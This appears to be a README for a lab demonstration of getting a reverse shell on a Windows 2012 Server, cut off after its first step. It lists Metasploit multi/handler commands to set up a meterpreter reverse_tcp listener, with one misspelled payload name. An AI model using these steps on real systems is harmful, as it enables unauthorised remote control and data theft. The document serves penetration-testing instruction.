# theperfectreverseshell
This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. The aim of obtaining access to view and copy the output produced by downloading certain tools to the compromised host to the attacking machine and then run a script to compare the produced data against a pre-defined list of data

### The following steps are provided to obtain a reverse shell on a Windows 2012 Server. The steps performed, were carried out in a secure environment. Please ensure, if you do choose to replicate this activity that you either do so as qualified practitioner or that you have a qualified practitioner with you.

# Step 1 : Create a reverse handler using metasploit. To do so, you run the following commands -
  -1 - sudo msfconsole, "\n"
  -2 - use multi/handler
  -3 - configure payload (preferable : windows/meterpreter/rerverse_tcp)
  -4 - ensure that the "LHOST" and "LPORT" settings are correctly configured. You may do so, by running : set LHOST <IP Address of Host> and the set LPORT <port you would like to listen on>
  -5 - once this has been completed, you may run : run -j or exploit -j at the msf prompt. This will create a persistent listener that will exit once you tell it to, it a disconnect from the client(victim). After doing so, you should see the following screen :
  
  ![image](https://user-images.githubusercontent.com/101802030/225633287-455e3c11-18a9-4bb8-b29f-a2d65dc23c86.png)

  
  


